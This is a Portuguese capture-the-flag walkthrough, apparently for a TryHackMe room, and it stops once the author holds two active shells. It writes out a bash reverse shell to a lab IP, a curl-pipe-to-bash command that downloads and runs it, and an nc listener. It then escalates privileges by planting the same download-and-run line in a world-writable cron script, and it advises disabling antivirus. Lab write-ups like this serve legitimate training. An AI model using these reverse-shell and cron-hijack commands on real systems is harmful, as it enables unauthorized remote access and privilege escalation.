# 🛡️ Exploração da Máquina — 0ff3ns!v3 S3cur!ty - Sw4gg3r

## 🔗 Links

- 💻 **Máquina:** [Google Drive - Máquina](https://drive.google.com/file/d/1XsuWUulDDdktnV6fpPgRIH172iASvVmz/view)
- 🔍 **Prova:** [TryHackMe - 0ff3ns!v3 S3cur!ty - Sw4gg3r](https://tryhackme.com/room/0ff3nsv3s3curtysw4gg3r)

---

## ⚠️ Obs: Desligar o antivírus

### 💡 A máquina parece ter o `curl`. Dá pra subir um arquivo shell usando um servidor Python, baixar com `curl`, executar e escutar a resposta do outro lado.

![image](https://github.com/user-attachments/assets/9de29dba-6b94-4492-9d84-54b28b5408e3)

### 📄 Conteúdo do arquivo `shell_2.sh`:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.100.168/4444 0>&1
```

### 🚀 Dentro dessa pasta, vamos subir o servidor Python para baixar com o curl:

![image](https://github.com/user-attachments/assets/ce117679-c08a-4e7b-90c8-79057e4d97db)

---

### 🌐 No site, usamos o comando `curl` para baixar o arquivo e em seguida já executá-lo:

```bash
curl http://[IP]:[PORTA]/shell_2.sh | bash
```

![image](https://github.com/user-attachments/assets/c0bba9e9-88df-4021-b2c9-9c3276935111)

### Confirmação : ::ffff:192.168.100.207 - - [21/May/2025 02:49:03] "GET /shell_2.sh HTTP/1.1" 200

### 📡 Em outro terminal, deixamos o listener pronto com:

```bash
nc -nlvp 4444
```

![image](https://github.com/user-attachments/assets/c3e6ad67-6e91-4442-a4e9-6196b32a58e2)

---

### ✅ Shell recebido! Agora é hora de fazer pós-exploração e escalar privilégios.

#### Acesso à máquina com usuário `www-data`:

---

### 🗂️ Aqui estão todos os arquivos encontrados com fuzzing. Agora vamos explorá-los em busca de algo útil.
![image](https://github.com/user-attachments/assets/a200a374-0976-4250-b338-69ea9889edbb)
### Dentro da pasta `/opt`, encontramos um script `.sh` que é executado via cron a cada minuto:

![image](https://github.com/user-attachments/assets/854a11c4-a51e-4e55-85b3-e3faf37ec0c1)

### 🔍 Entendendo o que ocorre dentro do script:

![image](https://github.com/user-attachments/assets/a5f88153-c1f1-40fa-88f6-4e6f5c855d4d)

---

## 🧠 Resumo: Como Escalar Privilégios para o Usuário 'swagger'

### Situação:
- Existe um arquivo chamado `script.sh` com permissão `777`:
  ```txt
  -rwxrwxrwx 1 user-swagger user-swagger 184 Jun 1 2023 script.sh
  ```
- Isso significa que **qualquer usuário pode ler, escrever e executar** esse arquivo.
- O **dono do arquivo é o usuário 'swagger'**, que tem mais privilégios que o usuário atual (`www-data`).

### Problema:
- Estamos logados como `www-data`, um usuário limitado.
- Executar o script manualmente com `www-data` **não eleva os privilégios**, porque o shell reverso retornará com os mesmos direitos de `www-data`.

### Solução:
1. Editar o `script.sh` e **inserir um comando de shell reverso**, por exemplo:
   ```bash
   curl http://192.168.100.168:8000/shell_2.sh | bash
   ```
2. **Esperar o cron job executá-lo automaticamente** (ele roda a cada minuto).
   - Como o script será executado pelo próprio usuário `swagger`, o shell reverso retornará com os privilégios dele.

### Conclusão:
- A escalada de privilégios acontece **não quando você executa o script manualmente**, mas quando o **cron do 'swagger' executa o script que você editou**.

![image](https://github.com/user-attachments/assets/b0322b76-b96a-4585-a5cf-a485ee1183bb)
- Por exemplo nesta imagem eu escalei previlegio do meu propio usuario e consegui, agora so fazer no arq do usuario swagger
---

### Agora vamos alterar o conteudo do arquivo e colocar para ele buscar naquele mesmo servidor python baixar e execuar o shel reverse enquanto escutamos do outro lado 
![image](https://github.com/user-attachments/assets/35d15a91-bf21-42f9-b622-afb6d0e2707c)
## Arquivo alterado com a shell ,agora abrimos outro terminal e escutamos na porta 4444 enquanto esperamos a atualização do comando que nos alteramos para enviar o cmd shell
![image](https://github.com/user-attachments/assets/c1d126d2-8923-42f5-823d-1ac0c41a0378)


### Temos duas shels ativas agora uma do wwwdata que era fraca e nao possuia mt previlegios , e a do swagger que vamos explorar ainda.
![image](https://github.com/user-attachments/assets/26fbd6bc-317c-48f5-9612-7495663d43b5)
